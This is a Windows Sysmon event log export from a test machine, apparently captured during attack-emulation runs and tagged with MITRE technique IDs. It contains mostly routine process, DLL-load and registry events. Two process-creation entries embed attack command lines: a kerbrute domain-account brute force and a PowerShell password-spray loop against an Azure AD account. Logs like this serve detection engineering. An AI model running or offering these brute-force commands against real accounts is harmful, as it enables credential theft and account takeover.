Level,Date and Time,Source,Event ID,Task Category
Information,12/3/2023 8:36:38 PM,Microsoft-Windows-Sysmon,5,Process terminated (rule: ProcessTerminate),"Process terminated:
RuleName: -
UtcTime: 2023-12-04 04:36:38.134
ProcessGuid: {1ac2ee8c-54fc-656d-0302-000000001000}
ProcessId: 8620
Image: C:\Users\Test\AppData\Local\Microsoft\OneDrive\23.226.1031.0003\Microsoft.SharePoint.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:13.807
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:36:13.807
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:13 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:13.166
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:36:12.775
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
PipeName: \PSHost.133461381725324290.8212.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:36:12.682
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1fb3dlvc.42t.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:36:12.650
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_1fb3dlvc.42t.ps1
CreationUtcTime: 2023-12-04 04:36:12.650
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:12.603
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:12.572
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:12.556
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:12.556
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:12.556
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:12.541
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:36:12.525
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-573c-656d-fa02-000000001000}
TargetProcessId: 8212
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:36:12.532
ProcessGuid: {1ac2ee8c-573c-656d-fa02-000000001000}
ProcessId: 8212
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {cd \""""C:temp\..\ExternalPayloads\""""
.\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:12.525
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:12.275
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:12 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
UtcTime: 2023-12-04 04:36:12.275
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Microsoft\Windows\PowerShell\StartupProfileData-NonInteractive
CreationUtcTime: 2023-12-04 04:32:15.278
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:11 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:11.401
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpClient.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: Client Interface
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mpclient.dll
Hashes: SHA1=212A30C8880BB14FE79802A1B0492CAE21D1B736,MD5=F6241AA123B9835ADD945B91D3805629,SHA256=5CFA0ACF6BD10FBEB3DB7FB642AE68EBE9F9C01D9F49A6082D1432914E766C57,IMPHASH=B9FF20C6C7B890C0C363159B3EA2D8CC
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,17,Pipe Created (rule: PipeEvent),"Pipe Created:
RuleName: -
EventType: CreatePipe
UtcTime: 2023-12-04 04:36:10.978
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
PipeName: \PSHost.133461381707463088.6624.DefaultAppDomain.powershell
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,26,File Delete logged (rule: FileDeleteDetected),"File Delete logged:
RuleName: -
UtcTime: 2023-12-04 04:36:10.869
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
User: DESKTOP-92IIJB9\Test
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_j3vp20dh.0nq.ps1
Hashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000
IsExecutable: false"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2023-12-04 04:36:10.853
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Test\AppData\Local\Temp\__PSScriptPolicyTest_j3vp20dh.0nq.ps1
CreationUtcTime: 2023-12-04 04:36:10.853
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1574.002,technique_name=DLL Side-Loading
UtcTime: 2023-12-04 04:36:10.807
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.23100.2009-0\MpOAV.dll
FileVersion: 4.18.23100.2009 (8fcbd1c22d82af16ba34560e1a70591413e88d17)
Description: IOfficeAntiVirus Module
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA1=E5E75A15EE46E0968665FF180C34880E163F27F0,MD5=E8EA978A581E6C3A616E69939CB2F5F3,SHA256=077043850436F281BB354D03A7F33042543E7C2BF4F46A865BAE60F37D8DEBDB,IMPHASH=28D3DE166C9E9C46DC0EA2089E2AC74E
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:10.791
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Just-In-Time Compiler
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clrjit.dll
Hashes: SHA1=7DCB8796F45514DD3F5CD55302B041319814A755,MD5=7412728F1DC9015FC4CC18AC6052B330,SHA256=001D135E1066C1BFAE80D33F15636206E2F81AF5A92D99F1335DE2E30D2561BA,IMPHASH=E20BEEF68C4C15FC6DC00AEDFC450D3C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:10.776
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NativeImages\mscorlib.ni.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft Common Language Runtime Class Library
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscorlib.dll
Hashes: SHA1=D0C40D928F13CF2F17741DAD44F8BA0045CAB6D2,MD5=1031BE45F7D69BA2F14CE068FFD33B25,SHA256=BC29F7D665E89E154B897FC1B122A91ADD9D74D5B4059B6BFF28CDE7D616E7CD,IMPHASH=00000000000000000000000000000000
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:10.776
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
FileVersion: 4.8.9167.0 built by: NET481REL1LAST_B
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: clr.dll
Hashes: SHA1=A77574470F744120D0AB5DD39A5D11D617FBEE31,MD5=6D8BC8BC19D5D926AF8FE4DC0D3DC071,SHA256=F5C68CED002FF441C7C5AA1083604FBA555E3D3CA6205E85E228009E59759313,IMPHASH=AB5E2E36C1E62672DDDD7B4D2E5D81D4
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:10.776
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
FileVersion: 4.8.9093.0 built by: NET481REL1LAST_C
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® .NET Framework
Company: Microsoft Corporation
OriginalFileName: mscoreei.dll
Hashes: SHA1=2186F29C0312A9BE5B9D08BD3A95DFC14A7BB0A4,MD5=89AB48AC59F9E5302E10A6A2ED5E9F9E,SHA256=791E1A6F0C1024B2AC8142F0D85B25A7510B57606EF2D903289BE76970ADE9DD,IMPHASH=BDAAD270BEE58C9A3A7622CD1CA3EF79
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,7,Image loaded (rule: ImageLoad),"Image loaded:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2023-12-04 04:36:10.760
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ImageLoaded: C:\Windows\System32\mscoree.dll
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: Microsoft .NET Runtime Execution Engine
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: mscoree.dll
Hashes: SHA1=CFEF8F0BA040939B87B74F101970A6BBEB5DA15F,MD5=D5971EF71DE1BDD46D537203ABFCC756,SHA256=8828DE042D008783BA5B31C82935A3ED38D5996927C3399B3E1FC6FE723FC84E,IMPHASH=65F23EFA1EB51A5DAAB399BFAA840074
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,10,Process accessed (rule: ProcessAccess),"Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2023-12-04 04:36:10.744
SourceProcessGUID: {1ac2ee8c-5439-656d-4601-000000001000}
SourceProcessId: 3600
SourceThreadId: 8604
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetProcessGUID: {1ac2ee8c-573a-656d-f802-000000001000}
TargetProcessId: 6624
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9e924|C:\Windows\System32\KERNELBASE.dll+5b473|C:\Windows\System32\KERNELBASE.dll+597e6|C:\Windows\System32\KERNEL32.DLL+1d334|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+351226|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3bb9|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\8ba31431f46342fbc94b91b95bc013cc\System.ni.dll+2b3529|UNKNOWN(00007FF96CAB2D25)
SourceUser: DESKTOP-92IIJB9\Test
TargetUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,1,Process Create (rule: ProcessCreate),"Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2023-12-04 04:36:10.746
ProcessGuid: {1ac2ee8c-573a-656d-f802-000000001000}
ProcessId: 6624
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.19041.2913 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Import-Module -Name AzureAD

$passwords = \""""Password1`n1q2w3e4r`nPassword!\"""".split(\""""{`n}\"""")
foreach($password in $passwords) {
  $PWord = ConvertTo-SecureString -String \""""$password\"""" -AsPlainText -Force
  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""""bruce.wayne@contoso.com\"""", $Pword
  try {
    Write-Host \"""" [-] Attempting ${password} on account bruce.wayne@contoso.com.\""""
    Connect-AzureAD -Credential $Credential 2>&1> $null
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host \"""" [!] bruce.wayne@contoso.com:${password} are valid credentials!`r`n\""""
    break
  } catch {
    Write-Host \"""" [-] bruce.wayne@contoso.com:${password} invalid credentials.`r`n\""""
  }
}
Write-Host \""""End of bruteforce\""""}
CurrentDirectory: C:\Users\Test\AppData\Local\Temp\
User: DESKTOP-92IIJB9\Test
LogonGuid: {1ac2ee8c-5412-656d-4c1f-130000000000}
LogonId: 0x131F4C
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=EB39E26A364ECD0691A59FCEF61A90334112617E,MD5=BCF01E61144D6D6325650134823198B8,SHA256=B4E7BC24BF3F5C3DA2EB6E9EC5EC10F90099DEFA91B820F2F3FC70DD9E4785C4,IMPHASH=88CB9A420410BDA787E305B65518A934
ParentProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ParentProcessId: 3600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:10.744
ProcessGuid: {1ac2ee8c-5439-656d-4601-000000001000}
ProcessId: 3600
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,13,Registry value set (rule: RegistryEvent),"Registry value set:
RuleName: -
EventType: SetValue
UtcTime: 2023-12-04 04:36:10.541
ProcessGuid: {1ac2ee8c-5738-656d-f602-000000001000}
ProcessId: 6188
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\System\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-275153265-2143659952-3435977433-1001\\Device\HarddiskVolume2\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Details: Binary Data
User: DESKTOP-92IIJB9\Test"
Information,12/3/2023 8:36:10 PM,Microsoft-Windows-Sysmon,11,File created (rule: FileCreate),"File created:
RuleName: -
